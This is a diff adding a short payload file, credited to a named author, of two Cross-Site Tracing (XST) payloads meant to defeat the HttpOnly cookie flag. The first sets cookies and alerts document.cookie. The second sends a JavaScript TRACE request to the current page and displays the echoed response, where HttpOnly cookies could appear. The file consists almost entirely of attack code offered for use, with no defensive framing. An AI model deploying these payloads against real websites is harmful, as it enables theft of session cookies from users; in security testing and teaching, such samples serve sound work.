@@ -1,0 +1,34 @@
+#By Ashish Kunwar aka Dorker Devil
+#XST payloads to exploit HTTPONLY FLAG
+
+httponly_XST Payload =>1
+
+<script> 
+function normalCookie() {    
+	document.cookie = "TheCookieName=CookieValue_httpOnly";    
+	alert(document.cookie); 
+}
+function httpOnlyCookie() {    
+	document.cookie = "TheCookieName=CookieValue_httpOnly; httpOnly";    
+	alert(document.cookie);
+}
+</script>
+<FORM> 
+<INPUT TYPE=BUTTON OnClick="normalCookie();" VALUE='Display Normal Cookie'> 
+<INPUT TYPE=BUTTON OnClick="httpOnlyCookie();" VALUE='Display HTTPONLY Cookie'> 
+</FORM> 
+
+
+httponly_XST Payload =>2
+
+<script type="text/javascript"> 
+function sendTrace () {    
+var xmlHttp = new XMLHttpRequest();    
+xmlHttp.open("TRACE", window.location);    
+xmlHttp.send();    
+xmlDoc=xmlHttp.responseText;    
+alert(xmlDoc); } 
+ 
+</script>
+<INPUT TYPE=BUTTON OnClick="sendTrace();" VALUE="Send Trace Request">
+
